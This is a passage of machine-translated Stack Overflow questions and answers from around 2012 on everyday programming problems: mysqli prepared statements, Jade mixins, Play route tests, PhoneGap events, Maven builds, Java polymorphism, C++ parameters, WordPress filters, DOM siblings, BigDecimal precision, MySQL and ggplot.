我是js的新手，所以如果问题很初级，请原谅我。我正在 maqetta (maqetta.org) 中设计一个页面并且喜欢使用状态！我唯一的问题是它调用状态的方式似乎如下： davinci.states.setState('state1')

例如在一个按钮中，它定义了一个 onclick proparty： onclick="davinci.states.setState('state1')"

现在，我的问题是，如果我想以不同于正常状态的状态加载我的页面，我该怎么办？

我试过这个：

```
<script> 
    window.onload=davinci.states.setState('state1')
</script> 
```

但它没有用！我认为这应该是一个非常简单的问题，但我找不到解决方案！有人可以帮我吗？

谢谢

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-12-31T03:30:14.553

它应该是

```
window.onload = function(){
    davinci.states.setState('state1')
} 
```

您可能还想参考
[http://www.w3schools.com/jsref/event_onload.asp](http://www.w3schools.com/jsref/event_onload.asp)
[使用 window.onload 的最佳实践](https://stackoverflow.com/questions/559150/best-practice-for-using-window-onload)
[https://developer.mozilla.org/en-US/docs/DOM/window.onload](https://developer.mozilla.org/en-US/docs/DOM/window.onload)

# php - 无法在 mysqli 中正确使用准备好的语句

> ID：14097106
> 
> 赞同：1
> 
> 时间：2012-12-31T03:28:17.563
> 
> 标签：php, mysqli

我正在学习php和mysqli，

我想打印 mysql 查询的结果。
到目前为止，我已经这样做了：

```
$link = mysqli_connect("host","user", "pass","db_name");
//error handling here
//printing host info here
$company_name = "ODEON";
$query = "select company from production where company = ?";
$stmt = mysqli_stmt_init($link);
if (!($stmt = mysqli_stmt_prepare($stmt, $query))){
     echo "Prepare failed: (" . $stmt->errno . ") " . mysqli_error($link);
}
var_dump($stmt); //for debugging
echo "before bind<br>";
if(!(mysqli_stmt_bind_param($stmt, "s", $company_name))){
    echo "Binding parameters failed: (" . $stmt->errno . ") " . mysqli_error($stmt);
}
echo "after bind<br>";
var_dump($stmt); //for debugging

if(!(mysqli_execute($stmt))){
    echo "Execute failed: (" . $stmt->errno . ") " . mysqli_error($stmt);  
}

printf("<hr>Results:<br>");
while($obj = mysqli_fetch_object($result)){
    printf("%s<br>", $obj->company_name);
}
mysqli_free_result($obj);
printf("<hr><br>");

mysqli_stmt_close($stmt);
mysqli_close($link); 
```

我得到的只是：

```
Host information: host via TCP/IP
Prepare failed: (0) NULL 
Binding parameters failed: () NULL 
Execute failed: () 
```

怎么了？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-01-01T23:48:40.927

终于解决了。问题是当我使用 localhost 时没有发布任何错误。所以，在我的 php.ini 文件位于

> /usr/local/zend/etc/php.ini

（由于安装了 zend 框架）将显示错误更改为 on..

代码的问题可能在这里：

> $stmt = mysqli_stmt_prepare($stmt, $query)

使用第一个参数，这是不需要的。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-12-31T03:51:19.500

我认为问题在于您使用[`mysqli_stmt_prepare`](http://php.net/manual/en/mysqli-stmt.prepare.php)

您正在传递，`$link`但是您需要传递声明。你需要打电话`$stmt = mysqli_stmt_init($link);`并通过`$stmt`。

从 PHP 文档中截取：

```
<?php
$link = mysqli_connect("localhost", "my_user", "my_password", "world");

/* check connection */
if (mysqli_connect_errno()) {
    printf("Connect failed: %s\n", mysqli_connect_error());
    exit();
}

$city = "Amersfoort";

/* create a prepared statement */
$stmt = mysqli_stmt_init($link);
if (mysqli_stmt_prepare($stmt, 'SELECT District FROM City WHERE Name=?')) {

    /* bind parameters for markers */
    mysqli_stmt_bind_param($stmt, "s", $city);

    /* execute query */
    mysqli_stmt_execute($stmt);

    /* bind result variables */
    mysqli_stmt_bind_result($stmt, $district);

    /* fetch value */
    mysqli_stmt_fetch($stmt);

    printf("%s is in district %s\n", $city, $district);

    /* close statement */
    mysqli_stmt_close($stmt);
}

/* close connection */
mysqli_close($link);
?> 
```

# pug - 玉块扩展：如何单行破块？

> ID：14097109
> 
> 赞同：2
> 
> 时间：2012-12-31T03:28:37.113
> 
> 标签：pug

您可以使用;在单行上[添加嵌套标签](https://github.com/visionmedia/jade#block-expansion) `:`例如，

```
ul
  li.first: a(href='#') foo
  li: a(href='#') bar
  li.last: a(href='#') baz 
```

但是如果我想在一个父元素下添加两个兄弟元素怎么办？例如，

```
button.btn.btn-danger
    i.icon-trash.icon-white
    |  Delete 
```

给出所需的输出：

```
<button class="btn btn-danger"><i class="icon-trash icon-white"></i> Delete</button> 
```

但是有没有办法在一条线上做到这一点？`???`也许还有一些其他的魔法操作员可以代替？我什至无法在我能弄清楚的 2 上做到这一点。

```
button.btn.btn-danger: i.icon-trash.icon-white ??? Delete 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-03-22T23:02:17.323

恐怕这种方式是不可能的。

Jade 0.13 引入了 mixin 来帮助用一行代码完成这种任务。

这是我定义mixin的方式：

```
 mixin icon-button(type,icon,label)
    button.btn(class=type)
      i(class=icon)
      | #{label} 
```

现在您可以使用一行来呈现您的按钮：

```
mixin icon-button('btn-danger','icon-trash icon-white','Delete') 
```

# unit-testing - 如何在 Play 2.0 框架中为路由编写独立的单元测试？

> ID：14097110
> 
> 赞同：3
> 
> 时间：2012-12-31T03:28:36.720
> 
> 标签：unit-testing, playframework-2.0

我的游戏框架应用程序在 scala 中（不是 Java）。我找到了一个描述如何使用实用程序类 play.test.Helpers 进行单元测试路由的页面。该示例是在 Java 中，而不是 scala。我在 scala 中编写了测试，但出现错误“消息：这不是 JavaAction，不能以这种方式调用。”

这是我找到的描述如何在 play framework 2.0 中对路线进行单元测试的页面：http: [//digitalsanctum.com/2012/05/28/play-framework-2-tutorial-testing/](http://digitalsanctum.com/2012/05/28/play-framework-2-tutorial-testing/)

...这是我尝试编写来测试我的应用程序的代码：

```
package conf
import org.scalatest._
import play.mvc.Result
import play.test.Helpers._

class routeTest extends FunSpec with ShouldMatchers {

  describe("route tests") {
    it("") {
      // routeAndCall() fails.  Message: This is not a JavaAction and can't be invoked this way.
      val result = routeAndCall(fakeRequest(GET, "/"))
      result should not be (null)
    }
  }
} 
```

问题是因为我的操作是 Scala 而不是 Java？我可以通过 Scala 控制器对我的路由进行单元测试吗？

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2012-12-31T03:52:53.300

您应该使用`play.api.*`来自 Scala 代码的导入。`play.*`是一个Java API。所以你的代码应该是这样的：

```
package conf

import org.scalatest._
import org.scalatest.matchers._
import play.api._
import play.api.mvc._
import play.api.test.Helpers._
import play.api.test._

class routeTest extends FunSpec with ShouldMatchers {
  describe("route tests") {
    it("GET / should return result") {
      val result = routeAndCall(FakeRequest(GET, "/"))
      result should be ('defined)
    }
  }
} 
```

甚至更好地使用`FlatSpec`：

```
package conf

import org.scalatest._
import org.scalatest.matchers._
import play.api._
import play.api.mvc._
import play.api.test.Helpers._
import play.api.test._

class routeTest extends FlatSpec with ShouldMatchers {

  "GET /" should "return result" in {
    val result = routeAndCall(FakeRequest(GET, "/"))
    result should be ('defined)
  }

  it should "return OK" in {
    val Some(result) = routeAndCall(FakeRequest(GET, "/"))
    status(result) should be (OK)
  }

} 
```

此外，`routeAndCall`不返回 null。它返回`Option[Result]`, 即`Some[Result]`or `None`，所以在这种情况下 null 检查不起作用。

# android - Phonegap android - deviceready 事件未触发

> ID：14097111
> 
> 赞同：13
> 
> 时间：2012-12-31T03:28:41.183
> 
> 标签：android, cordova, mobile, cross-platform

我在网上搜索了我的问题的解决方案，发现了许多相关的线程，不幸的是，提供的解决方案都不适用于我的案例。我是 android 开发的新手，并遵循了[Apache Cordova](http://docs.phonegap.com/en/2.1.0/guide_getting-started_android_index.md.html#Getting%20Started%20with%20Android)上的文档！用于配置。

**问题**：未触发 deviceready 事件，以下是我的代码和配置以及错误日志。请指教我做错了什么，谢谢！！！

**模拟器**

```
AVD Device: nexus 7
Target: Android 4.2
Memory RAM: 512 
```

**MainActivity.java**

```
 package com.example.pollo;

    import android.os.Bundle;
    import org.apache.cordova.*;
    import android.app.Activity;

    public class MainActivity extends DroidGap {

        @Override
        public void onCreate(Bundle savedInstanceState) {
            super.onCreate(savedInstanceState);
            super.loadUrl("file:///android_asset/www/index.html");
        }
    } 
```

**索引.html**

```
 <html>
      <head>
        <title></title>
        <script src="cordova-2.2.0.js"></script>
        <script>
                function onLoad(){
                   console.log("Now Loading");
                   document.addEventListener("deviceready", myDeviceReadyListener, false);  
                }

                function myDeviceReadyListener(){
                    console.log("Device ready");
                    navigator.notification.alert("Phone is ready!");

                    var myDiv = document.getElementById('props');
                    myDiv.innerHTML = 'Device Name: ' + device.name;
                }
            </script>
      </head>
      <body onload="onLoad()">
        <h1>X App V.11</h1>
        <p id="props">Loading device properties...</p>
      </body>
    </html> 
```

**AndroidManifest.xml**

```
 <?xml version="1.0" encoding="utf-8"?>
    <manifest xmlns:android="http://schemas.android.com/apk/res/android"
        package="com.example.pollo"
        android:versionCode="1"
        android:versionName="1.0" >

        <uses-sdk
            android:minSdkVersion="7"
            android:targetSdkVersion="17" />

        <supports-screens
            android:largeScreens="true"
            android:normalScreens="true"
            android:smallScreens="true"
            android:xlargeScreens="true"
            android:resizeable="true"
            android:anyDensity="true"
            />    
        <uses-permission android:name="android.permission.CAMERA" />
<uses-permission android:name="android.permission.VIBRATE" />
<uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION" />
<uses-permission android:name="android.permission.ACCESS_FINE_LOCATION" />
<uses-permission android:name="android.permission.ACCESS_LOCATION_EXTRA_COMMANDS" />
<uses-permission android:name="android.permission.INTERNET" />
<uses-permission android:name="android.permission.RECEIVE_SMS" />
<uses-permission android:name="android.permission.RECORD_AUDIO" />
<uses-permission android:name="android.permission.RECORD_VIDEO"/>
<uses-permission android:name="android.permission.MODIFY_AUDIO_SETTINGS" />
<uses-permission android:name="android.permission.READ_CONTACTS" />
<uses-permission android:name="android.permission.WRITE_CONTACTS" />   
<uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE" />   
<uses-permission android:name="android.permission.ACCESS_NETWORK_STATE" />
<uses-permission android:name="android.permission.GET_ACCOUNTS" />
<uses-permission android:name="android.permission.BROADCAST_STICKY" />

<application
    android:allowBackup="true"
    android:icon="@drawable/ic_launcher"
    android:label="@string/app_name"
    android:theme="@style/AppTheme" >
    <activity
        android:configChanges="orientation|keyboardHidden|keyboard|screenSize|locale"
        android:name="com.example.pollo.MainActivity"
        android:label="@string/app_name" >
        <intent-filter>
            <action android:name="android.intent.action.MAIN" />

            <category android:name="android.intent.category.LAUNCHER" />
        </intent-filter>
    </activity>
</application>

    </manifest> 
```

**配置**

```
assets>www>cordova-2.2.0.js
assets>www>index.html
res>xml>config.xml
AndroidManifest.xml
libs>cordova-2.2.0.jar
libs>android-support-v13.jar 
```

**Logcat - 错误日志**

```
 12-31 01:50:58.323: E/Trace(659): error opening trace file: No such file or directory (2)
 12-31 01:51:45.653: E/StrictMode(552): android.app.ServiceConnectionLeaked: Service com.android.exchange.ExchangeService has leaked ServiceConnection com.android.emailcommon.service.ServiceProxy$ProxyConnection@40d1b278 that was originally bound here 
```

调用了 onLoad() 但未调用 myDeviceReadyListener() 〜它与我选择的模拟器有什么关系吗？

* * *

## 回答 #1

> 赞同：12
> 
> 时间：2012-12-31T07:47:59.750

有趣的是，昨天刚遇到同样的问题。我花了几个小时调试，我只能发现在 cordova-2.2.0.js 的第 6016 行，应用程序似乎默默地退出执行。为什么？不知道...日志中没有错误。也许一些新的权限或类似的东西。

无论如何，在浪费了很多时间调试之后，我从头开始使用 PhoneGap 教程。我注意到在 PhoneGap 2.2.0 发布时，他们使用的 API 级别是 16，而不是 17（这是我使用的和您使用的）。一旦我将应用程序的目标设置为 API 级别 16，一切都会重新开始工作。

要点：现在将您的应用的目标 API 级别设置为 16（Android 4.1.2），您的应用将收到 deviceready 事件。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-08-01T09:48:37.863

确保您安装了正确版本的节点。Phonegap 在安装期间检查节点版本，但如果您稍后切换到其他（旧）版本，它只会在编译时静默失败，这会导致 deviceready 事件不触发。

# java - 如何编译引用另一个本地更改的 maven 项目的 maven 项目？

> ID：14097113
> 
> 赞同：3
> 
> 时间：2012-12-31T03:29:02.713
> 
> 标签：java, maven

我有 2 个项目，A 和 B。B 是 lib 项目，A 引用 B。当我向 B 添加新函数时，可以`mvn install`在 B 上运行，但`mvn install`由于无法从 new 中找到符号，它在 A 上失败B.

我确定我确实在项目B上正确安装了，但是为什么A仍然无法编译和安装？

这是A的pom.xml：

```
<dependency>
    <groupId>A and B's group</groupId>
    <artifactId>B</artifactId>
    <scope>provided</scope>     
</dependency> 
```

任何线索？谢谢

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-12-31T11:04:57.747

我建议创建一个多模块构建，如下所示：

```
+-- root
      +-- pom.xml
      +-- module-A
      +-- module-B 
```

在根 pom 中，您需要像这样定义模块并将包装定义为**pom**。

```
<modules>
  <module>module-A</module>
  <module>module-B</module>
</modules> 
```

此外，您可以简单地通过以下方式定义模块-A 到模块-B 的依赖关系：

```
<project ..
  <parent>
     <groupId>project.parent</groupId>
     <artifactId>parent</artifactId>
     <version>1.0-SNAPSHOT</version>
  </parent>

  <artifactId>module-A</artifactId>

  <dependencies>
    <dependency>
      <groupId>${project.groupId}</groupId>
      <artifactId>module-B</artifactId>
      <version>${project.version}</version>
    </dependency>
    ..
  </dependencies>
  ..
</project> 
```

使用此设置，您只需通过以下方式从根文件夹构建所有模块：

```
mvn clean package 
```

或者您可以将该结构导入 Eclipse（安装了 m2e？）或任何其他 IDE，如 IntelliJ 或 Netbeans。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-12-31T07:21:20.873

您可以`<version>`在项目和依赖项的声明中包含该元素。

*   从 Maven 命令行传递版本变量。例如：`${build.version}`

模块 A `pom.xml`：

```
<groupId>A & B's Group ID</groupId>
<artifactId>A</artifactId>
<version>${build.version}</version>

<dependencies>
    <dependency>
        <groupId>A & B's Group ID</groupId>
        <artifactId>B</artifactId>
        <version>${build.version}</version>
        <type>war</type>
        <scope>provided</scope>
    </dependency>   
... 
```

因此，每当构建和安装项目 B 时，该依赖项将在该特定版本的本地 maven 存储库中可用，并将由项目 A 选择

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-12-31T03:55:31.273

尝试`mvn clean install`对 A 进行全新构建，或者`mvn -U install`强制 Maven 查找更新的快照。听起来您的环境仍在使用较旧的 JAR。很难从这个描述中看出你的设置是什么——听起来你正在正确地将 B 安装到你的本地存储库，但我不确定你的 IDE 是否也可能试图“提供帮助”。

# java - 多态性有什么用？（爪哇）

> ID：14097114
> 
> 赞同：-5
> 
> 时间：2012-12-31T03:29:04.187
> 
> 标签：java, polymorphism

> **可能的重复：**
> [什么是多态性？](https://stackoverflow.com/questions/1031273/what-is-polymorphism)

我目前正在学习 Java 中的多态性，但我无法理解它有什么用处。我一直看到人们说如果你想制作一个圆形或方形，那么你会创建一个名为“shape”的超类，这样你就可以调用单独的圆形和方形类，但为什么不创建单独的对象呢？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-12-31T03:41:05.410

如果你的圆形和方形有一个方法render()，那么有人可以像这样实现一个对象渲染器：

```
class Renderer {
    Canvas c;

    public Renderer(Canvas c) {
        this.c = c;
    }

    public void draw(Shape shape) {
        shape.render(c);
    }
} 
```

因此渲染器可以在任何 Canvas（或 Canvas 的子类）、您可以提供的任何 Shape 上绘制。

不同的是-没有多态性-您必须编写如下内容：

```
class Renderer {
    Canvas c;

    public Renderer(Canvas c) {
        this.c = c;
    }

    public void draw(Circle circle) {
        circle.render(c);
    }

    public void draw(Square square) {
        square.render(c);
    }

    public void draw(Triangle square) {
        triangle.render(c);
    }
    // and so on...
} 
```

然后你可能会想，如果我有不同类型的画布怎么办？PaperCanvas、WoodCanvas、ClothCanvas 等等……渲染器和 Shapes 仍然可以使用抽象`Canvas`来与该对象进行交互，而无需了解实现细节以及它们可能被绘制到的所有可能的 Canvas 类型。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-12-31T03:49:52.733

在生物学中，多态性是生物体或物种可以具有许多不同形式或阶段的能力。在面向对象编程中。编程也有同样的概念，一个对象可以以多种形式存在。

假设您有这个 Employee 类。

```
public class Employee{
   public int computeSalary(){
       //How would you compute the salary of an average employee
    }
} 
```

接下来是您有一个名为 BasePlusComission Employee 的子类

```
 public class BasePlusCommissionEmployee extends Employee{
          public int computeSalary(){
               //Commision employee salary computation + Base Employee salary computation
            }
} 
```

你有这个 CommissionEmployee

```
 public class CommissionEmployee extends Employee{
              public int computeSalary(){
                   //Commision employee salary computation
                }
    } 
```

现在，我们要多态地处理这个雇员的计算。我们可以做的

```
public void computeEmployeeSalary(Employee emp){
     emp.computeSalary();
} 
```

此方法将接收任何类型的 Employee 对象（这意味着我们可以传递 Employee 对象的子类）。一旦你通过了它，它将计算传递的员工（参数），并且它的 computeSalary() 将被调用，

即使您传递了 BasePlusCommission Employee 或 CommissionEmployee，它也会根据其实现计算其薪水，这要归功于 Dynamic 方法查找。

另一个更清晰的解释。您可以创建一组或一组员工。

```
Employee[] employees = { new BasePlusComissionEmployee(), new CommissionEmployee,new Employee()}; 
```

你想让这些对象计算他们的薪水。你可以像这样多态地处理他们的计算

```
for(int i = 0; i < employees.length;i++){
    employees[i].computeSalary();
} 
```

请注意，即使数组声明是 Employee，它们的`computeSalary()`实现也会根据`computeSalary();`员工数组的每个对象的每个类实现而有所不同

# c++ - C ++我应该做什么而不是全局变量？

> ID：14097116
> 
> 赞同：0
> 
> 时间：2012-12-31T03:29:10.077
> 
> 标签：c++, global

> **可能重复：**
> [C++：从函数访问主变量的最简单方法？](https://stackoverflow.com/questions/9668985/c-easiest-way-to-access-main-variable-from-function)

我需要将我的变量“输入”从 a.cpp 中的主函数获取到另一个名为 check in b.cpp 的函数。我在谷歌和这个论坛/东西上调查了它，我发现你可以使用全局变量来做到这一点`extern`，但使用这些也很糟糕，我找不到替代方案的答案？我应该如何在不使用全局变量的情况下将变量中的数据传输到其他函数？

* * *

我如何让论点起作用的代码。（我在这里尝试做的是一个控制台“管理器”，用于解决欧拉项目的解决方案，我可以通过输入调用它来解决/查看，我在 40 分钟前开始处理代码。）

主文件

```
#include <iostream>
#include <windows.h>
#include "prob.h"

using namespace std;

int check(string x);

int main()
{
    string input = "empty";
    clear();

    cout << "Welcome to the Apeture Labs Project Euler Console! (ALPEC)" << endl << endl;
    cout << "We remind you that ALPEC will never threaten to stab you" << endl;
    cout << "and, in fact, cannot speak. In the event that ALPEC does speak, " << endl;
    cout << "we urge you to disregard its advice." << endl << endl;
    cin >> input;
    cin.get();
    check(input);

    cout << input << endl;
    cin.get();
    return 0;
} 
```

概率.h

```
#ifndef PROB_H_INCLUDED
#define PROB_H_INCLUDED

int main();

int clear();
int check();
int back();

int P1();
int P2();
int P3();
int P4();

#endif // PROB_H_INCLUDED 
```

返回.cpp

```
#include <iostream>
#include <windows.h>
#include "prob.h"

using namespace std;

int clear()
{
    system( "@echo off" );
    system( "color 09" );
    system( "cls" );

    return 0;
}

int check( string x )
{
    if( x == "help" );

    if( x == "empty" )
    {
        cout << "And....  You didn't enter anything..." << endl << endl;
    }

    else
    {
        cout << "Do you have any clue what you are doing? " << endl << endl;
    }

    return 0;
} 
```

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-12-31T03:32:52.220

通过将数据作为函数参数传递。

例如：

```
int doSomething(int passedVar)
{
}

int main()
{
    int i = 10;
    doSomething(i);

    return 0;
} 
```

请注意，函数定义甚至可能驻留在不同的 cpp 文件中。`main`只需要查看函数声明，链接器应正确链接函数定义 。

通常，我们会在头文件中添加函数声明并将头文件包含在 main 中，同时在另一个 cpp 文件中提供函数定义。

* * *

您显示的代码有许多问题：

*   不需要`main`在头文件中声明。
*   您的函数声明和定义`check()`不匹配。你的头文件说它不需要参数，你定义了一个函数定义来接受一个参数。显然，它们不匹配。就目前而言，它们是两个完全不同的功能。

正如编译器所看到的，您声明了一个您从未提供过的定义的函数，并且您在 cpp 文件中定义了另一个函数。因此，从未定义过声明的函数（*一个没有参数*的函数），因此未找到定义错误。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-12-31T03:33:38.640

安德烈蒂塔是绝对正确的。如果您在一个模块中有一个“值”（例如，a.cp​​p 中的“main()”），并且您希望在函数中使用该值（例如，b.cpp 中的“foo()”）......那么只需将该值作为函数参数传递！

随着您的程序变得越来越复杂，您可能会开始使用类（而不是函数）。

# php - Wordpress 如果 is_page 功能不起作用

> ID：14097119
> 
> 赞同：3
> 
> 时间：2012-12-31T03:29:48.770
> 
> 标签：php, wordpress

我正在尝试向我的 Wordpress 主题添加一个功能，该功能将在每个帖子之前和之后添加内容，但不在任何页面上。这似乎不起作用，但不知道为什么。

```
if(!is_page()) {
  function custom_content($content) {
    $content = 'before post content' . $content . 'after post content';
    return $content;
  }
  add_filter('the_content','custom_content');
} 
```

编辑：我最终得到的解决方案对我有用，`is_single`只包含在单个帖子中。如果您想包含在单个页面上，请使用`is_singular`

```
function custom_content($content) {
    if (is_single()) {
        $content = 'before post content' . $content . 'after post content';
 }
    return $content;
}
add_filter ('the_content', 'custom_content', 0); 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-01-10T21:20:46.460

您可能在循环中使用它。is_page() 仅在循环外有效。

[https://codex.wordpress.org/Function_Reference/is_page](https://codex.wordpress.org/Function_Reference/is_page)

# javascript - 这段代码是否正确？我觉得应该是

> ID：14097120
> 
> 赞同：3
> 
> 时间：2012-12-31T03:29:49.817
> 
> 标签：javascript, dom

我一直在学习 JavaScript，我遇到了这个：

HTML：

```
<ul id="nav">
<li><a href="/" id="home">Home</a></li>
<li><a href="/about" id="about">About Us</a></li>
<li><a href="/contact" id="contact">Contact Us</a></li>
</ul> 
```

JavaScript：

```
document.getElementById("about").parentNode.setAttribute("class", "active");
document.getElementById("about").parentNode.previousSibling.setAttribute("class", "previous");
document.getElementById("about").parentNode.nextSibling.setAttribute("class", "next"); 
```

但每次我运行这段代码时，我都会得到一个“TypeError”。唯一一个似乎有效的是`document.getElementById("about").parentNode.setAttribute`.

这是正确的，还是那些最终无缘无故永远不会起作用的奇怪事情？

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-12-31T03:34:14.833

`<li>`该问题是由每个节点之间的换行符引起的。使用此 HTML 将起作用：

```
<ul id="nav">
   <li><a href="/" id="home">Home</a></li><li><a href="/about" id="about">About Us</a></li><li><a href="/contact" id="contact">Contact Us</a></li>
</ul> 
```

在换行符完好无损的情况下，`previousSibling`and`nextSibling`是`textNode`包含换行符的 a。

我建议改用jQuery——使用[jQuery](http://jquery.com/)选择器可以避免这些类型的问题。

* * *

## 回答 #2

> 赞同：4
> 
> 时间：2012-12-31T03:34:21.290

`previousSibling`指向一个不是元素的节点。

你可以使用[`previousElementSibling`](https://developer.mozilla.org/en-US/docs/DOM/Element.previousElementSibling). < IE9 不支持此功能，因此您可以创建一个函数...

```
var previousElementSibling = function(node) {

     if (node.previousElementSibling) {
         return node.previousElementSibling;
     }

     do {
         node = node.previousSibling;
     } while (node && node.nodeType != 1);

     return node;
}; 
```

[js小提琴](http://jsfiddle.net/5vFTk/)。

如果存在，这将使用本机`previousElementSibling`，否则它将回退到循环先前的兄弟姐妹，直到找到一个节点是一个元素。如果不存在，则返回`null`，就像`previousElementSibling`属性一样。

# java - BigDecimal 精度爆炸

> ID：14097127
> 
> 赞同：5
> 
> 时间：2012-12-31T03:30:56.253
> 
> 标签：java, scala, math, bigdecimal, arbitrary-precision

我正在尝试以大于双精度的固定精度在 Scala（和/或 Java）中进行计算。我将 BigDecimals 与 Scala 的默认[MathContext](http://docs.oracle.com/javase/1.5.0/docs/api/java/math/MathContext.html#DECIMAL128)一起使用，其精度为 34。即使所有输入都具有此精度，但我发现经过几次计算后，结果的精度开始爆炸式增长。

这是一个我认为可以说明问题的示例计算：

```
import math.BigDecimal

val z40 = BigDecimal(0).setScale(40) // 0E-40
z40.scale                            // 40
z40.precision                        // 1
(1 + z40*z40).precision              // 81 
```

结果为 81，精度高于`z40`. 就我而言，我从不使用 setScale，但在计算中会出现比例非常大的零。

这不是我想要的行为。我想要`(1 + z40*z40)`精度 34 - 执行计算的 MathContext 的精度（因为`z40*z40`与 1 相比小得可以忽略不计）。我怎样才能得到这种算术？

**更新：**此行为是由于Scala 2.9.* 和 2.10.* 之间[的 MathContexts 处理发生了变化。](https://github.com/scala/scala/commit/3a1332c451)（感谢 Paul Phillips 指出提交。）另请参阅[此讨论](https://groups.google.com/d/topic/scala-user/xibgQ9BCa7I/discussion)。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-12-31T04:12:09.440

似乎很奇怪。我尝试了您的代码并得到了您预期的结果：

```
$ scala
Welcome to Scala version 2.9.2 (Java HotSpot(TM) 64-Bit Server VM, Java 1.7.0_10).
Type in expressions to have them evaluated.
Type :help for more information.

scala> import math.BigDecimal
import math.BigDecimal

scala> val z40 = BigDecimal(0).setScale(40)
z40: scala.math.BigDecimal = 0E-40

scala> z40.scale
res0: Int = 40

scala> z40.precision
res1: Int = 1

scala> (1 + z40*z40).precision
res2: Int = 34

scala> _ 
```

如您所见，正如您`(1+z40*z40).precision`所`34`料。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-12-31T04:10:52.883

其实我相信最后一行

```
(1 + z40*z40).precision 
```

产生结果`34`（不是`81`）。我认为这里的精度实际上并没有增加。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-12-31T09:21:45.693

以下是如何创建 BigDecimals：

```
val z1 = BigDecimal(1, new java.math.MathContext(
  40, java.math.RoundingMode.valueOf(
    scala.math.BigDecimal.RoundingMode.HALF_UP.toString)))

val z40 = BigDecimal(0, new java.math.MathContext(
  40, java.math.RoundingMode.valueOf(
    scala.math.BigDecimal.RoundingMode.HALF_UP.toString))) 
```

看不到任何精准爆炸。只需使用适当的`MathContext`.

# mysql - 在 MySQL 中每 2 分钟间隔选择最新记录

> ID：14097135
> 
> 赞同：2
> 
> 时间：2012-12-31T03:32:16.427
> 
> 标签：mysql, large-data-volumes

我想将大约 8000 个文件读取到一个表中，每个文件都包含不同股票的每日股价，然后选择每 2 分钟间隔内的最新价格，如果间隔内没有可用记录，则写入 Null。我的想法是添加一个名为 bucketNumber 的列来指示记录属于哪个区间，创建另一个表，其中包含一列值 1、2、...、195，重复 8000 次，然后连接这两个表。最后为具有相同bucketNumber的记录选择时间戳最大的记录。

这是完成工作的好方法吗？如果是，那么如何有效地生成一列值 1、2、...、195 重复 8000 次的表。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-12-31T05:14:31.790

似乎存储过程将是最简单的方法。只需遍历每 2 分钟的时间间隔，然后从该时间间隔内具有最长时间的记录中选择价格。您可以包含开始时间和结束时间的参数，这将提供更通用的解决方案。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-12-31T04:12:27.720

这是一个查询，它将返回一列从 1 到 8000 的整数值

```
SELECT thousands.d*1000 + hundreds.d*100 + tens.d*10 + ones.d + 1 AS num
  FROM ( SELECT 0 AS d UNION ALL SELECT 1 UNION ALL SELECT 2 UNION ALL SELECT 3 
                       UNION ALL SELECT 4 UNION ALL SELECT 5 UNION ALL SELECT 6
                       UNION ALL SELECT 7 UNION ALL SELECT 8 UNION ALL SELECT 9
       ) ones
 CROSS      
  JOIN ( SELECT 0 AS d UNION ALL SELECT 1 UNION ALL SELECT 2 UNION ALL SELECT 3 
                       UNION ALL SELECT 4 UNION ALL SELECT 5 UNION ALL SELECT 6
                       UNION ALL SELECT 7 UNION ALL SELECT 8 UNION ALL SELECT 9
       ) tens
 CROSS
  JOIN ( SELECT 0 AS d UNION ALL SELECT 1 UNION ALL SELECT 2 UNION ALL SELECT 3 
                       UNION ALL SELECT 4 UNION ALL SELECT 5 UNION ALL SELECT 6
                       UNION ALL SELECT 7 UNION ALL SELECT 8 UNION ALL SELECT 9
       ) hundreds
 CROSS
  JOIN ( SELECT 0 AS d UNION ALL SELECT 1 UNION ALL SELECT 2 UNION ALL SELECT 3 
                       UNION ALL SELECT 4 UNION ALL SELECT 5 UNION ALL SELECT 6
                       UNION ALL SELECT 7 UNION ALL SELECT 8 UNION ALL SELECT 9
       ) thousands
HAVING num <= 8000
ORDER BY num 
```

# r - r中带有覆盖圆（填充和大小）的行列热图

> ID：14097136
> 
> 赞同：5
> 
> 时间：2012-12-31T03:32:19.483
> 
> 标签：r, plot, ggplot2, heatmap

这是我正在尝试开发的图表：

![在此处输入图像描述](../Images/09ea809cc774fcea80f24a0bd397bc68.png)

我有行和列坐标变量，还有三个定量变量（rectheat = 填充矩形热图，circlesize = 圆圈大小，circlefill = 填充颜色热图）。NA 应该缺失，由不同的颜色（例如灰色）表示。

以下是数据：

```
set.seed (1234)
rectheat = sample(c(rnorm (10, 5,1), NA, NA), 7*14, replace = T)

dataf <- data.frame (rowv = rep (1:7, 14), columnv = rep(1:14, each = 7),
          rectheat, circlesize = rectheat*1.5,
          circlefill =  rectheat*10 )
dataf 
```

这是我处理的代码：

```
require(ggplot2)
ggplot(dataf, aes(y = factor(rowv),x = factor(columnv))) +
      geom_rect(aes(colour = rectheat)) +
     geom_point(aes(colour = circlefill, size =circlesize))  + theme_bw() 
```

我不确定 geom_rect 是否合适，其他部分是否正常，因为除了错误之外我无法得到任何结果。

* * *

## 回答 #1

> 赞同：13
> 
> 时间：2012-12-31T04:15:12.387

这里最好使用`geom_tile`（热图）。

```
require(ggplot2)
  ggplot(dataf, aes(y = factor(rowv),
             x = factor(columnv))) +        ## global aes
  geom_tile(aes(fill = rectheat)) +         ## to get the rect filled
  geom_point(aes(colour = circlefill, 
                   size =circlesize))  +    ## geom_point for circle illusion
  scale_color_gradient(low = "yellow",  
                       high = "red")+       ## color of the corresponding aes
  scale_size(range = c(1, 20))+             ## to tune the size of circles
